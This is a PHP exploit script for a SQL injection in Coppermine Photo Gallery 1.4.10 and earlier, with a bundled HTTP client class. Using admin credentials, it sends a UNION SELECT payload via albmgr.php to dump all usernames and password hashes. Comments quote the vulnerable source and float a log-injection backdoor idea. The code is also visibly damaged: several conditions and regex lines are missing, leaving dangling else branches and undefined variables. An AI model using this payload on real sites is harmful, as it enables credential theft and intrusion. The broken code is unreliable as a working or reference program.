Coppermine Photo Gallery <= 1.4.10 Remote SQL Injection Exploit
===============================================================



#!/usr/bin/php
<?php
if($argc < 4)
{
       print "\n---------------------------------------------------------";
       print "\nAffected.scr..: Coppermine Photo Gallery <= 1.4.10";
       print "\nType..........: SQL Injection";
       print "\nRisk.level....: Medium";
       print "\nSrc.download..: coppermine-gallery.net";
       print "\nCredits.......: DarkFig";
       print "\n---------------------------------------------------------";
       print "\nUsage.........: php xpl.php <url> <adminuser> <adminpass>";
       print "\nProxyOptions..: <proxhost:proxport> <proxuser:proxpass>";
       print "\nExample.......: php xpl.php http://c.com/ admin passwd";
       print "\n---------------------------------------------------------\n";
       exit(1);
}


/*/
 [0] => xpl.php         [1] => http://localhost/cpg1410/
 [2] => root            [3] => toor
 [4] => localhost:8200  [5] => user:passwd
/*/
$url=$argv[1];$adu=$argv[2];
$adp=$argv[3];$pxs=$argv[4];
$pxa=$argv[5];

$xpl = new phpsploit();
$xpl->agent("InternetExploiter");
$xpl->cookiejar(1);
$xpl->allowredirection(1);

print "\nheader> ===============================================";
print "\nheader> Coppermine Photo Gallery 1.4.10 (SQL Injection)";
print "\nheader> ===============================================";

if(!empty($pxs)){
       print "\nstatus> Using a proxy $pxs";
       $xpl->proxy($pxs);
}

if(!empty($pxa)){
       print "\nstatus> Basic proxy authentification $pxa";
       $xpl->proxyauth($pxa);
}


/*/
/*/
print "\nstatus> Searching the version";
$xpl->get($url.&#039;include/index.html&#039;);
else print "\nsploit> Not found";
$table = !empty($matches[1]) ? &#039;cpg&#039;.str_replace(&#039;.&#039;,&#039;&#039;,$matches[1]).&#039;_users&#039; : &#039;cpg1410_users&#039;;


/*/
 If you have the admin cookie (but not the password),
 replace lines 73=>76 by $xpl->addcookie(&#039;yourcookie&#039;);
/*/
print "\nstatus> Trying to get logged in";
$xpl->post($url."login.php?referer=index.php","username=$adu&password=$adp&remember_me=1&submitted=Se+Connecter");
else die("\nstatus> Exploit failed\n");


/*/
 (usermgr.php)
 =============
 case &#039;group_alb_access&#039; :
 if (isset($_GET[&#039;gid&#039;]))  $group_id = $_GET[&#039;gid&#039;];
 $sql = "SELECT group_name  FROM [...] WHERE group_id = $group_id [...]";
 $result = cpg_db_query($sql);

 (db_ecard.php)
 ==============
 $start = isset($_REQUEST[&#039;start&#039;]) ? $_REQUEST[&#039;start&#039;] : &#039;&#039;;  [...]
 if (!$start) {$startFrom = &#039;0&#039;;}else{$startFrom=$start;}  [...]
 $result = cpg_db_query("SELECT [...] ORDER BY $sortBy $sortDirection LIMIT $startFrom,$countTo");

 (albmgr.php)
 ============
 $cat = isset($_GET[&#039;cat&#039;]) ? ($_GET[&#039;cat&#039;]) : 0;
 if ($cat == 1) $cat = 0;
 if (GALLERY_ADMIN_MODE) {
 $result = cpg_db_query("SELECT [...] WHERE category = $cat ORDER BY pos ASC");

 (filename_to_title())
 =====================
 $albumid = (isset($_POST[&#039;albumid&#039;])) ? $_POST[&#039;albumid&#039;] : 0;
 $albstr = ($albumid) ? " WHERE aid = $albumid" : &#039;&#039;; [...]
 $result = cpg_db_query("SELECT * FROM {$CONFIG[&#039;TABLE_PICTURES&#039;]} $albstr");

 (del_titles())
 ==============
 $albumid = (isset($_POST[&#039;albumid&#039;])) ? $_POST[&#039;albumid&#039;] : 0;
 $albstr = ($albumid) ? " WHERE aid = $albumid" : &#039;&#039;;
 $result = cpg_db_query("SELECT * FROM {$CONFIG[&#039;TABLE_PICTURES&#039;]} $albstr");
/*/
print "\nstatus> Retrieving all members password";
$xpl->get($url."albmgr.php?cat=-1/**/union/**/select/**/user_name,user_password/**/from/**/$table/*");
else die("\nstatus> Exploit failed\n");

print "\nsploit> +----------------------------------+----------+";
print "\nsploit> |             PASSWORD             |   USER   |";
print "\nsploit> +----------------------------------+----------+";


/*/
 (init.inc.php)
 ==============
 $HTML_SUBST = array(&#039;&&#039; => &#039;&&#039;, &#039;"&#039; => &#039;"&#039;, &#039;<&#039; => &#039;<&#039;, &#039;>&#039; => &#039;>&#039;, &#039;%26&#039; => &#039;&&#039;, &#039;%22&#039; => &#039;"&#039;, &#039;%3C&#039; => &#039;<&#039;, &#039;%3E&#039; => &#039;>&#039;,&#039;%27&#039; => &#039;&#39;&#039;, "&#039;" => &#039;&#39;&#039;);
 [...]
 if (is_array($_POST)) { // and GET, SERVER, REQUEST...
 foreach ($_POST as $key => $value) {
 if (!is_array($value))
 $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);
 if (!in_array($key, $keysToSkip) && isset($$key)) unset($$key);
 }

 ... that&#039;s why we use the html_entity_decode() function.
 I just wanted < for a remote php code execution sploit without admin rights :&#039;(.
 When the admin view the security logs, it include "security.log.php"...

 (security.log.php)
 ==================
 [...]
 if (!defined(&#039;IN_COPPERMINE&#039;)) die(); ?>

 Denied privileged access to viewlog.php from user Guest at  on January 4, 2007, 2:10 pm
 Failed login attempt with Username: <?php mail(you); [...] fwrite(backdoor.php); [...] /* from IP 127.0.0.1 on Jan 04, 2007 at 01:16 PM
/*/
for($i=0;$i<count($matches[0]);$i++)
{
       print "\nsploit> | ".$matches[2][$i].&#039; | &#039;.html_entity_decode($matches[1][$i]);
       if($i==(count($matches[0])-1)){
       print "\nsploit> +----------------------------------+----------+\n";
       }
}

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don&#039;t have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);
		else $socket = fsockopen($this->host,$this->port);
		
		if(!$socket) die("Error: The host doesn&#039;t exist");
		
		if($this->method==="get") $this->packet = "GET ".$this->url." HTTP/1.1\r\n";
		elseif($this->method==="post") $this->packet = "POST ".$this->url. " HTTP/1.1\r\n";
		else die("Error: Invalid method");
		
		if(!empty($this->proxyuser)) $this->packet .= "Proxy-Authorization: Basic ".base64_encode($this->proxyuser.":".$this->proxypass)."\r\n";
		$this->packet .= "Host: ".$this->host."\r\n";
		
		if(!empty($this->agent))  $this->packet .= "User-Agent: ".$this->agent."\r\n";
		if(!empty($this->header)) $this->packet .= $this->header."\r\n";
		if(!empty($this->cookie)) $this->packet .= "Cookie: ".$this->cookie."\r\n";
		
		$this->packet .= "Connection: Close\r\n";
		if($this->method==="post")
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		$this->packet .= "\r\n";
		$this->recv = &#039;&#039;;
		
		fputs($socket,$this->packet);
		while(!feof($socket)) $this->recv .= fgets($socket);
		fclose($socket);
		
		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv));
		if($this->allowredirection) return $this->allowredirection($this->recv);
		else return $this->recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this->addcookie("name","value");
	 * or
	 * $this->addcookie("name=newvalue");
	 * or
	 * $this->addcookie("othername=overvalue; xx=zz; y=u");
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv=&#039;&#039;)
	{
		// $this->addcookie("name","value"); work avec replace
		if(!empty($cookv))
		{
			if($cookv === "deleted") $cookv=&#039;&#039;; // cookiejar(1) && Set-Cookie: name=delete
			if(!empty($this->cookie))
			{
			    {
			    }
			    else
			    {
			    	$this->cookie .= " ".$cookn."=".$cookv.";"; // " ".
			    }
			}
			else
			{
				$this->cookie = $cookn."=".$cookv.";";
			}
		}
		// $this->addcookie("name=value; othername=othervalue");
		else
		{
	    	 if(!empty($this->cookie))
	    	 {
	    	 	$cookarr = explode(";",str_replace(" ", "",$cookn));
	    	 	for($i=0;$i<count($cookarr);$i++)
	    	 	{
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this->addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===";") ? $cookn : $cookn.";";
			 	$this->cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this->addheader("headername","headervalue");
	 * or
	 * $this->addheader("headername: headervalue");
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue=&#039;&#039;)
	{
		// $this->addheader("name","value");
		if(!empty($headervalue))
		{
			if(!empty($this->header))
			{
				{
				}
				else
				{
					$this->header .= "\r\n".$headern.": ".$headervalue;
				}
			}
			else
			{
				$this->header=$headern.": ".$headervalue;
			}
		}
		// $this->addheader("name: value");
		else 
		{
			if(!empty($this->header))
			{
				$headarr = explode(": ",$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this->addheader($headern,$headerv);
			}
			else
			{
				$this->header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this->proxy("proxyip","8118");
	 * or
	 * $this->proxy("proxyip:8118")
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp=&#039;&#039;)
	{
		// $this->proxy("localhost:8118");
		if(empty($proxyp))
		{
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this->proxyhost=$proxh;
			$this->proxyport=$proxp;
		}
		// $this->proxy("localhost",8118);
		else 
		{
			$this->proxyhost=$proxy;
			$this->proxyport=intval($proxyp);
		}
		if($this->proxyport > 65535) die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this->proxyauth("darkfig","dapasswd");
	 * or
	 * $this->proxyauth("darkfig:dapasswd");
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse=&#039;&#039;)
	{
		// $this->proxyauth("darkfig:password");
		if(empty($proxypasse))
		{
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this->proxyuser=$proxu;
			$this->proxypass=$proxp;
		}
		// $this->proxyauth("darkfig","password");
		else
		{
			$this->proxyuser=$proxyauth;
			$this->proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the "User-Agent" header.
	 * Several methods are possible to do that:
	 * 
	 * $this->agent("Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent: Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent","Mozilla Firefox");
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this->agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this->showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this->header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this->showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this->cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this->showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this->packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * 
	 * $this->get("http://localhost");
	 * $this->get("http://localhost:888/xd/tst.php");
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this->target($url);
		$this->method="get";
		return $this->sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * 
	 * $this->post("http://localhost/index.php","admin=1&user=dark");
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this->target($url);
		$this->method="post";
		$this->data=$data;
		return $this->sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this->getcontent($this->get("http://localhost/"));
	 * or
	 * $this->getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code=&#039;&#039;)
	{
		if(empty($code)) $code = $this->recv;
		$content = explode("\n",$code);
		$onlycode = &#039;&#039;;
		for($i=1;$i<count($content);$i++)
		{
			if($ok) $onlycode .= $content[$i]."\n";
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this->getheader($this->post("http://localhost/x.php","x=1&z=2"));
	 * or
	 * $this->getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code=&#039;&#039;)
	{
		if(empty($code)) $code = $this->recv;
		$header = explode("\n",$code);
		$onlyheader = $header[0]."\n";
		for($i=1;$i<count($header);$i++)
		{
			$onlyheader .= $header[$i]."\n";
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the "Set-Cookie" header in the "Cookie"
	 * header for the next request. You don&#039;t have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode("\n",str_replace("\r\n","\n",$code));
		for($z=0;$z<count($carr);$z++)
		{
			{
			}
		}

		for($i=0;$i<count($cookie);$i++)
		{
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this->addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don&#039;t have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		$this->url=$urltarg;
		
		$this->host=$array[0];

		$this->port=empty($matches[1]) ? 80 : $matches[1];
		
		$this->path=str_replace("//","/","/".$matches[1]."/");
	
		if($this->port > 65535) die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all "Set-Cookie" headers values
	 * and it will automatically add them into the "Cookie" header
	 * for all next requests.
	 *
	 * $this->cookiejar(1); // enabled
	 * $this->cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this->cookiejar=&#039;&#039;;
		if($code===1) $this->cookiejar=1;
		else
		{
			$this->getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this->allowredirection(1); // enabled
	 * $this->allowredirection(0); // disabled
	 * 
	 * @return $this->get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this->allowredirection=&#039;&#039;;
		if($code===1) $this->allowredirection=1;
		else
		{
			{
				$location = str_replace(chr(13),&#039;&#039;,$codearr[2]);
				if(!eregi("://",$location))
				{
					return $this->get("http://".$this->host.$this->path.$location);
				}
				else
				{
					return $this->get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this->reset(header); // headers cleaned
	 * $this->reset(cookie); // cookies cleaned
	 * $this->reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func=&#039;&#039;)
	{
		switch($func)
		{
			case "header":
			$this->header=&#039;&#039;;
			break;
			
			case "cookie":
			$this->cookie=&#039;&#039;;
			break;
			
			default:
		        $this->cookiejar=&#039;&#039;;
		        $this->header=&#039;&#039;;
		        $this->cookie=&#039;&#039;;
		        $this->allowredirection=&#039;&#039;; 
		        $this->agent=&#039;&#039;;
		        break;
		}
	}
}

?>



